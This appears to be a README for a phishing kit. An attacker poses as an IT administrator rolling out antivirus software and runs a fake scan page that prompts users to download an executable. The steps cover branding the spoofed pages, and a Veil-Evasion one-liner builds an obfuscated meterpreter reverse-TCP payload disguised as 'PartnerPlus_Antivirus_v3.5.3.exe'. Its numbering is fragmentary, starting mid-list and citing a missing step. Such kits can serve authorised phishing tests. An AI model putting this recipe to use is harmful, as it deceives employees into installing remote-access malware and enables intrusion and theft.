Pretext:
	Spoofing as an IT administrator, you're pushing out new antivirus software and need users to help run an automated scan to see if the new software was pushed to their computer and is up-to-date. At around 70% during the scan, the user will be prompted to download an executeable file to update their software.

Things to Change:
	login, scan and failed pages: 
		name="logo" -> update to the company logo
			Store company logo in the images folder. name it logo.png
	include/style-login-new.css
		footer#bottom -> update the background:# to the spoofed company color if wanted. 
		header -> update background-color:# to spoofed company color if wanted.

	PartnerPlus_Antivirus_v3.5.3.exe

      1.c. ./setup/setup.sh -s
   2. Creating a payload
      2.a. you can use the step-by-step instructions found in step 2.b. or modify and use the one-liner below
         2.a.i. # ./Veil-Evasion.py  -l  python -p python/b64_substitution  -o trytofindthis –msfpayload windows/meterpreter/reverse_tcp –msfoptions LHOST=<listening box> LPORT=443

   3. MAKE SURE YOU NAME IT PartnerPlus_Antivirus_v3.5.3.exe or you'll have to edit the 'failed' page.
